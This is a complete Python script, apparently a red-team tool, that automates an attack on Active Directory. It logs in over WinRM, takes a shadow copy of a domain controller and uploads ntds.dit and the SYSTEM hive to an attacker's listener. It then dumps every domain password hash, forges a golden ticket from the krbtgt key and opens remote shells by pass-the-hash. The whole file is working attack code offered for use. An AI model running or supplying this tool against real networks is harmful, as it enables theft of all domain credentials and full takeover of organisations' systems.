#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################
#▄▄▄      ▓█████▄ ▓█████ ▒██   ██▒  █████▒██▓ ██▓                                                              #
#▒████▄    ▒██▀ ██▌▓█   ▀ ▒▒ █ █ ▒░▓██   ▒▓██▒▓██▒                                                             #
#▒██  ▀█▄  ░██   █▌▒███   ░░  █   ░▒████ ░▒██▒▒██░                                                             #
#░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄  ░ █ █ ▒ ░▓█▒  ░░██░▒██░                                                             #
#▓█   ▓██▒░▒████▓ ░▒████▒▒██▒ ▒██▒░▒█░   ░██░░██████▒                                                          #
#▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░ ▒ ░   ░▓  ░ ▒░▓  ░                                                          #
#▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░░░   ░▒ ░ ░      ▒ ░░ ░ ▒  ░                                                           #
#░   ▒    ░ ░  ░    ░    ░    ░   ░ ░    ▒ ░  ░ ░                                                              #
#░  ░   ░       ░  ░ ░    ░          ░      ░  ░                                                               #
#░                                                                                                             #
# DATE                                                                                                         #
# 23/11/2018                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
# This script automates the process of exfiltrate the active directory database "ntds.dit" and then use it     #
# with pass-the-hash attacks to pop shells                                                                     #
#                                                                                                              #
# [nighter@nighter.se]                                                                                         #
################################################################################################################

import winrm
import signal
import os
import time
import sys

from multiprocessing import Process

# Execute script from working directory.
os.chdir(os.path.dirname(sys.argv[0]))

# Settings
WEBDAV_BIN = ''
DUMPDIR = "%s/.exfiltrate" % os.path.expanduser("~")

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print("\nYou pressed Ctrl+C!")
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def puts(tp, message):
    """Output messages in fancy colors."""
    if tp == 'info':
        print("%s%s%s%s" % ('\033[93m', "\033[90m[\033[93m➜\033[90m]\033[93m ".decode('utf-8'), message, '\033[0m'))
    elif tp == 'error':
        print("%s%s%s%s" % ('\033[91m', "\033[90m[\033[91m✖\033[90m]\033[91m ".decode('utf-8'), message, '\033[0m'))
    elif tp == 'success':
        print("%s%s%s%s" % ('\033[92m', "\033[90m[\033[92m✔\033[90m]\033[92m ".decode('utf-8'), message, '\033[0m'))


def check_dependencies():

    global WEBDAV_BIN
    global DUMPDIR

    if os.path.isfile('/usr/bin/secretsdump.py') is False:
        puts('error', 'impackets-secretsdump.py is not installed')
        sys.exit(1)

    if os.path.isfile('/usr/bin/ticketer.py') is False:
        puts('error', 'impackets-ticketer.py is not installed')
        sys.exit(1)

    if os.path.isfile('/usr/bin/psexec.py') is False:
        puts('error', 'impackets-psexec.py is not installed')
        sys.exit(1)

    if os.path.isfile('%s/.webdav.py' % os.path.dirname(os.path.abspath(__file__))) is True:
        WEBDAV_BIN = '%s/.webdav.py' % os.path.dirname(os.path.abspath(__file__))
    elif os.path.isfile('/usr/bin/webdav.py') is True:
        WEBDAV_BIN = '/usr/bin/webdav.py'
    else:
        puts('error', 'webdav.py is not installed')
        sys.exit(1)

    if os.path.isdir(DUMPDIR) is False:
        os.makedirs(DUMPDIR)


def mount_shadow_copy():

    s = winrm.Session(HOST, auth=(USERNAME, PASSWORD))
    r = s.run_cmd('vssadmin.exe', ['create', 'shadow', '/for=C:'])
    output = r.std_out

    shadow_success = False
    try:
        if ([x for x in output.split('\n') if 'Successfully created shadow copy' in x][0]) > 0:
            shadow_success = True
    except:
        puts('error', 'failure in mount shadow_copy')
        sys.exit(1)

    try:
        shadow_id = str([x.strip() for x in output.split('\n') if 'Shadow Copy ID:' in x][0]).split(':')[1].strip()
    except:
        puts('error', 'could not find shadow_id')
        sys.exit(1)

    try:
        shadow_volume = str([x.strip() for x in output.split('\n') if 'Shadow Copy Volume Name:' in x][0]).split(':')[1].strip()
    except:
        puts('error', 'could not find shadow volume')
        sys.exit(1)

    puts('success', 'mounted shadow_copy')
    return (shadow_success, shadow_id, shadow_volume)


def unmount_shadow_copy(shadow_id=None):
    s = winrm.Session(HOST, auth=(USERNAME, PASSWORD))

    if shadow_id is None:
        r = s.run_cmd('vssadmin.exe', ['delete', 'shadows', '/All', '/Quiet'])
    else:
        r = s.run_cmd('vssadmin.exe', ['delete', 'shadows', '/shadow="%s"' % shadow_id, '/Quiet'])

    if 'Volume Shadow Copy Service administrative command-line tool' in r.std_out:
        puts('success', 'unmounted shadow_copy')
        return True
    else:
        return False

def start_webdav_server():

    os.chdir(DUMPDIR)
    try:
        os.system("timeout 10 %s" % WEBDAV_BIN)
    except:
        pass

def loot_ntds(shadow_volume):

    s = winrm.Session(HOST, auth=(USERNAME, PASSWORD))

    ps_script = """$WebClient = New-Object System.Net.WebClient;$WebClient.UploadFile("http://%s:8080/ntds.dit", "PUT", "%s\\windows\\ntds\\ntds.dit")""" % (LHOST, shadow_volume)
    s.run_ps(ps_script)

    ps_script = """$WebClient = New-Object System.Net.WebClient;$WebClient.UploadFile("http://%s:8080/SYSTEM", "PUT", "%s\\windows\\system32\\config\\SYSTEM")""" % (LHOST, shadow_volume)
    s.run_ps(ps_script)


def dump_active_directory_database():

    global DUMPDIR

    check_dependencies()

    if os.path.isfile("%s/ntds.dit" % DUMPDIR) is True and \
            os.path.isfile("%s/SYSTEM" % DUMPDIR) is True:
        puts('info', 'ntds.dit already exists, will perform extraction')
        extract_hashes()
        return True

    p = Process(target=start_webdav_server)
    p.start()

    (shadow_success, shadow_id, shadow_volume) = mount_shadow_copy()
    loot_ntds(shadow_volume)
    unmount_shadow_copy(shadow_id)

    if os.path.isfile("%s/ntds.dit" % DUMPDIR):
        puts('success', 'sucessfully looted ntds.dit into ~/.exfiltrate/ntds.dit')

    if os.path.isfile("%s/SYSTEM" % DUMPDIR):
        puts('success', 'sucessfully looted SYSTEM into ~/.exfiltrate/SYSTEM')

    extract_hashes()
    golden_ticket()


def extract_hashes():

    global DUMPDIR
    puts('info', 'extract hashes')

    if os.path.isfile('/usr/bin/secretsdump.py') is False:
        puts('error', 'impackets-secretsdump.py is not installed')
        sys.exit(1)

    if os.path.isfile("%s/ntds.dit" % DUMPDIR) is False:
        puts('error', 'could not find ntds.dit, extraction failed')
        sys.exit(1)

    if os.path.isfile("%s/SYSTEM" % DUMPDIR) is False:
        puts('error', 'could not find SYSTEM, extraction failed')
        sys.exit(1)

    os.system('/usr/bin/secretsdump.py -ntds %s/ntds.dit -outputfile %s/hashes.txt -system %s/SYSTEM LOCAL' % (DUMPDIR, DUMPDIR, DUMPDIR))


def golden_ticket():

    global DUMPDIR
    os.chdir(DUMPDIR)

    puts('info', 'forges a golden_ticket')

    if os.path.isfile('/usr/bin/ticketer.py') is False:
        puts('error', 'impackets-ticketer.py is not installed')
        sys.exit(1)

    if os.path.isfile('%s/hashes.txt.ntds.kerberos' % DUMPDIR) is False:
        puts('error', 'hashes.txt.ntds.kerberos not found')
        sys.exit(1)

    s = winrm.Session(HOST, auth=(USERNAME, PASSWORD))
    ps_script = """\
Import-Module ActiveDirectory
Get-ADDomain
"""
    r = s.run_ps(ps_script)
    output = r.std_out

    try:
        dnsroot = str([x.strip() for x in output.split('\n') if x.startswith('DNSRoot')][0]).split(':')[1].strip()
    except:
        puts('error', 'dnsroot not found')
        return False

    try:
        domainsid = str([x.strip() for x in output.split('\n') if x.startswith('DomainSID')][0]).split(':')[1].strip()
    except:
        puts('error', 'DomainSID not found')
        return False

    with open('%s/hashes.txt.ntds.kerberos' % DUMPDIR) as file:
        try:
            krbtg_hash = str([x.strip() for x in file.readlines() if x.startswith('krbtgt:aes128-cts-hmac-sha1-96')][0]).split(':')[2].strip()
        except:
            puts('error', 'krbtg hash not found')
            sys.exit(1)

    os.system('/usr/bin/ticketer.py -nthash %s -domain-sid %s -domain %s administrator' % (krbtg_hash, domainsid, dnsroot))
    puts('success', 'golden_ticket created in ~/.exfiltrate/administrator.ccache')


def exec_pass_the_hash(command=''):

    global DUMPDIR
    if len(command) == 0:
        command = 'cmd.exe'

    (_user,_host) = HOST.split('@')

    if os.path.isfile('/usr/bin/psexec.py') is False:
        puts('error', 'impackets-psexec.py is not installed')
        sys.exit(1)

    if os.path.isfile('%s/hashes.txt.ntds' % DUMPDIR) is False:
        puts('error', 'hashes.txt.ntds not found')
        sys.exit(1)

    with open('%s/hashes.txt.ntds' % DUMPDIR) as file:
        try:
            _hashes = str([x.strip() for x in file.readlines() if x.startswith(_user)][0]).split(':')
            hash = "%s:%s" % (_hashes[2], _hashes[3])
        except:
            puts('error', 'Did not find hash for user: %s' % _user)
            sys.exit(0)

    os.system('/usr/bin/psexec.py -hashes %s %s@%s %s' % (hash,_user, _host, command))


def ntds_list():

    global DUMPDIR

    if os.path.isfile('%s/hashes.txt.ntds' % DUMPDIR) is False:
        puts('error', 'hashes.txt.ntds not found')
        os._exit(0)

    with open('%s/hashes.txt.ntds' % DUMPDIR) as file:
        for f in file.readlines():
            print(f.strip())

def print_usage():
    print ("""
 ▄▄▄      ▓█████▄ ▓█████ ▒██   ██▒  █████▒██▓ ██▓
▒████▄    ▒██▀ ██▌▓█   ▀ ▒▒ █ █ ▒░▓██   ▒▓██▒▓██▒
▒██  ▀█▄  ░██   █▌▒███   ░░  █   ░▒████ ░▒██▒▒██░
░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄  ░ █ █ ▒ ░▓█▒  ░░██░▒██░
 ▓█   ▓██▒░▒████▓ ░▒████▒▒██▒ ▒██▒░▒█░   ░██░░██████▒
 ▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░ ▒ ░   ░▓  ░ ▒░▓  ░
  ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░░░   ░▒ ░ ░      ▒ ░░ ░ ▒  ░
  ░   ▒    ░ ░  ░    ░    ░    ░   ░ ░    ▒ ░  ░ ░
      ░  ░   ░       ░  ░ ░    ░          ░      ░  ░
           ░
Active Directory exfilitration & shell popping.

<~~~~~~~~~~~~~~~~~~~~~~~[Active Directory]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>

ntds_dump <HOST> <LHOST <USERNAME> <PASSWORD>    *Loot AD database*
ntds_list                                        *List retrieved hashes*

<~~~~~~~~~~~~~~~~~~~~~~~~~[Shell popping]~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>

exec      <USER>@<HOST> [commad]     *Execute command with Pass-the-hash*

<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>

EXAMPLES

exfiltrate.py ntds_dump 192.168.56.2 192.168.1.81 vagrant vagrant
exfiltrate.py exec Administrator@192.168.56.2 cmd.exe
exfiltrate.py ntds_list
    """)

    sys.exit(0)

if __name__ == '__main__':

    try:
        if sys.argv[1] == 'ntds_list':
            ntds_list()
            os._exit(0)
    except:
        pass

    if len(sys.argv) < 2:
        print_usage()

    TYPE = sys.argv[1]
    HOST = sys.argv[2]

    if TYPE == 'exec':

        if '@' not in HOST:
           print_usage()

        try:
            command = sys.argv[3]
        except:
            command = ''

        exec_pass_the_hash(command)
        sys.exit(0)

    if len(sys.argv) < 5:
        print_usage()

    LHOST = sys.argv[3]
    USERNAME = sys.argv[4]
    PASSWORD = sys.argv[5]

    if TYPE == 'ntds_dump':
        puts('success',"lhost = %s" % LHOST)
        dump_active_directory_database()
